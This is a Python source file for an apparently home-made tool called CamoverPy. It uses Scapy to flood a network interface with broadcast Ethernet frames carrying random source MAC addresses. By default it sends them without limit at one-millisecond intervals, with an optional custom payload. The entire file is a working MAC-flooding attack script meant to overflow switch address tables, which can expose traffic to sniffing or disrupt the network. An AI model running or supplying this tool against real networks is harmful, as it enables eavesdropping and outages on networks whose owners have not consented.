from scapy.all import Ether, sendp, RandMAC, Raw
import psutil
import argparse
import time

DEFAULT_PACKET = "CAMOVERPY PACKET >:)"

def generate_mac_flood_packet(packet):
    
    eth = Ether(
        src=RandMAC(), # Source: Random MAC Address
        dst="FF:FF:FF:FF:FF:FF") # Destination: Broadcast MAC Address
    raw = Raw(load=packet) # Loads raw data
    return eth / raw # In Scapy, the / operator is used to concatenate layers of a frame, rather than divide two numbers
        
# Ensures that custom packet data exists
def validate_custom_packet(custom_packet):
    try:
        # 'rb' means read binary
        with open(custom_packet,"rb") as packet_contents:
            return packet_contents.read()
    except Exception as e:
            print(f"[!] {e}")
            print("[!] Using default packet data")
            return DEFAULT_PACKET

# Ensures that interface exists
def validate_interface(iface,packet):
    try:
        sendp(generate_mac_flood_packet(packet),iface=iface,verbose=False)
        return True
    except ValueError as e:
        print(f"[!] {e}")
        print("[*] Try one of these interfaces:")
        print(", ".join(list(psutil.net_if_addrs().keys()))) 
        print("[*] Use the -i argument to specify an interface")
        return False
    # This code should never run (hopefully)
    except Exception as e:
        print(f"[!] {e}")
        print("[?] You're on your own for this one")
        return False
    
def progress_bar(completed,total):
    if total == 0:
        return "[..........]"
    else:
        return f"[{'#' * int(completed / total * 10)}{'.' * (10 - int(completed / total * 10))}]"

def main():
    # Get arguments from command line
    parser = argparse.ArgumentParser(description="CamoverPy: A Layer 2 Packet Overflow Tool")
    parser.add_argument("-?",action="help",help="show this help message and exit")
    parser.add_argument('-i', '--interface', default=" ", help="Interface to send packets on (if a valid interface isn't specified, a list of interfaces will be shown)")
    parser.add_argument('-n', '--number', type=int, default=0, help="Number of packets to send (0 = unlimited)")
    parser.add_argument('-d', '--delay', type=float, default=0.001, help="Delay between packets in seconds (defaults to 1ms)")
    parser.add_argument("-p","--packet",type=str,default="",help="Specify custom .bin file to use for packet")
    args = parser.parse_args()

    # Sets the packet to the default packet. If a valid custom packet is found,
    # this variable is changed later.
    packet = DEFAULT_PACKET

    # If custom packet is specified, ensure it's valid
    if args.packet != "":
        packet = validate_custom_packet(args.packet)
    
    # Generates packet
    packet = generate_mac_flood_packet(packet=packet)
    
    # If interface isn't valid, end the program
    if not validate_interface(args.interface,packet):
        return
    
    # Keeps track of number of packets sent
    count = 1
    
    print(f"[*] Sending {'infinite' if args.number == 0 else args.number} packet{'' if args.number == 1 else 's'} on interface {args.interface}")
    
    try:
        while args.number == 0 or count < args.number:
            # Sends packet using scapy
            sendp(packet, iface=args.interface,verbose=False)
            count += 1
            print(f"{progress_bar(count,args.number)} [{count}/{args.number}]",end="\r")
            if args.delay > 0:
                time.sleep(args.delay)
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
    except Exception as e:
        print(f"\n[!] {e}")
    finally:
        print("\nDone.")
        
if __name__ == "__main__":
    main()
